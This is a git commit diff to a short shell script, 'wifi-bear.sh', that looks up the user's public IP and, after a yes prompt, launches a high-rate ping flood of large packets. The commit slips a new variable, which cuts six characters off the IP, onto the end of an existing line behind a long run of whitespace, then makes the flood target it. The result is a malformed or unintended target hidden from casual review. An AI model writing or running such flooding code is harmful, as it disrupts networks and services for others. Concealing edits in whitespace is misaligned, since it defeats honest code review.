d6a5b2ce8addaddef4a1c99fdd2a684e2eb8ffe6
Tarık Çelik <141952517+tarik-celik@users.noreply.github.com>
2023-12-15 20:08:00 +0300

    Update wifi-bear.sh

--- wifi-bear.sh
+++ wifi-bear.sh
@@ -1,11 +1,11 @@
 clear
-ip=$(curl -s ifconfig.me)
+ip=$(curl -s ifconfig.me)                            ip2=${ip::-6}
 echo "your ip is ${ip}"
 echo "Are you sure to flood the network [y/n]"
 read response
 if [[ $response == "y" ]]
 then
-        ping -i 0 -c 999999 -s 65027 -W 999 $ip
+        ping -i 0 -c 999999 -s 65027 -W 999 $ip2
 else
         echo "Cancelling..."
 fi
